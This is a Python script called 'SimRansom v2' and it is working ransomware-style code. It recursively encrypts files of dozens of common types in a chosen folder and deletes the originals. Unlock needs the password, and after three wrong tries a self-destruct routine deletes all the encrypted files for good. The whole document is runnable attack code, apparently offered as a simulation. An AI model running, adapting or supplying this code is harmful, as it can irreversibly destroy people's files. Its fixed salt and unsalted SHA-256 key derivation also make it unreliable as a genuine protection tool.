#!/usr/bin/env python3
import os
import base64
import hashlib
import time
from cryptography.fernet import Fernet
from getpass import getpass
from colorama import Fore, init
from datetime import datetime

init(autoreset=True)

LOG_FILE = "ransom_log.txt"
PASS_FILE = "ransom_password.txt"
MAX_ATTEMPTS = 3

# ✅ Supported file types
common_types = [
    'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'odt', 'ods', 'odp',
    'jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'webp', 'ico',
    'mp3', 'wav', 'ogg', 'flac', 'aac', 'm4a',
    'mp4', 'mkv', 'avi', 'mov', 'wmv', 'flv', 'webm',
    'zip', 'rar', '7z', 'tar', 'gz', 'bz2', 'xz',
    'apk', 'exe', 'msi', 'deb', 'rpm',
    'py', 'sh', 'bat', 'js', 'html', 'css', 'json', 'xml', 'csv', 'yaml', 'yml',
    'c', 'cpp', 'java', 'php', 'rb', 'go', 'rs', 'kt', 'swift', 'ts',
    'db', 'sqlite', 'log', 'bak', 'cfg', 'ini'
]

# ✅ Strong password hashing (PBKDF2)
def hash_password(password, salt=b'simransom_salt'):
    return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000).hex()

# ✅ Generate encryption key from password
def generate_key(password):
    key = hashlib.sha256(password.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key))

# ✅ Logging to file
def log_action(action, file):
    with open(LOG_FILE, 'a') as log:
        log.write(f"[{datetime.now()}] {action}: {file}\n")

# ✅ Encrypt file
def encrypt_file(filepath, cipher):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(filepath + ".locked", 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
        log_action("Encrypted", filepath)
        print(f"{Fore.GREEN}[\u2713] Encrypted: {filepath}")
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to encrypt {filepath}: {str(e)}")

# ✅ Decrypt file
def decrypt_file(filepath, cipher):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        decrypted = cipher.decrypt(data)
        original = filepath.replace(".locked", "")
        with open(original, 'wb') as f:
            f.write(decrypted)
        os.remove(filepath)
        log_action("Decrypted", filepath)
        print(f"{Fore.YELLOW}[\u2713] Decrypted: {filepath}")
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to decrypt {filepath}: {str(e)}")

# ❌ Self-destruct: delete all .locked files
def self_destruct(folder):
    print(Fore.RED + "\n\U0001F4A3 Too many wrong attempts! Initiating self-destruct...\n")
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file.endswith(".locked"):
                try:
                    os.remove(os.path.join(root, file))
                    print(f"{Fore.RED}Deleted: {file}")
                    log_action("Deleted (self-destruct)", file)
                except:
                    pass
    print(Fore.RED + "\u2620\ufe0f  All encrypted files destroyed.")

# ✅ Preview files before unlock
def preview_locked_files(folder):
    locked_files = []
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file.endswith(".locked"):
                locked_files.append(os.path.join(root, file))
    if not locked_files:
        print(Fore.RED + "[X] No .locked files found!")
        return []

    print(Fore.YELLOW + "\n\U0001F513 Files ready to decrypt:\n")
    for i, f in enumerate(locked_files, 1):
        print(f"{i}. {f}")
    print(Fore.GREEN + f"\n\U0001F7E2 Total: {len(locked_files)} files\n")
    confirm = input("\U0001F449 Proceed to decrypt? (y/n): ").strip().lower()
    if confirm != 'y':
        print(Fore.RED + "\u274C Decryption cancelled.")
        return []
    return locked_files

# ✅ Main
def main():
    print(Fore.CYAN + "\n\U0001F510 SimRansom v2 — Advanced File Locker\n")

    mode = input("\U0001F504 Mode (lock/unlock): ").strip().lower()
    folder = input("\U0001F4C1 Enter target folder path: ").strip()

    if not os.path.isdir(folder):
        print(Fore.RED + "[X] Invalid folder path!")
        return

    # 🔐 Password validation
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        password = getpass("\U0001F511 Enter password: ")
        hashed = hash_password(password)

        if mode == "lock":
            # Save password hash only during lock
            with open(PASS_FILE, 'w') as f:
                f.write(hashed)
            break
        elif mode == "unlock":
            if not os.path.exists(PASS_FILE):
                print(Fore.RED + "[X] No stored password hash found!")
                return
            with open(PASS_FILE) as f:
                saved = f.read().strip()
            if hashed == saved:
                break
            else:
                print(Fore.RED + "[X] Wrong password!")
                attempts += 1
        else:
            print(Fore.RED + "[X] Invalid mode!")
            return

    if attempts >= MAX_ATTEMPTS:
        self_destruct(folder)
        return

    cipher = generate_key(password)
    count = 0

    if mode == "unlock":
        files_to_process = preview_locked_files(folder)
        if not files_to_process:
            return
        for filepath in files_to_process:
            decrypt_file(filepath, cipher)
            count += 1
    elif mode == "lock":
        for root, dirs, files in os.walk(folder):
            for file in files:
                filepath = os.path.join(root, file)
                ext = file.split('.')[-1].lower()
                if not file.endswith(".locked") and ext in common_types:
                    encrypt_file(filepath, cipher)
                    count += 1

    print(Fore.CYAN + f"\n\u2705 Total files processed: {count}")
    log_action("Summary", f"{mode.upper()} processed {count} files.")

if __name__ == '__main__':
    main()
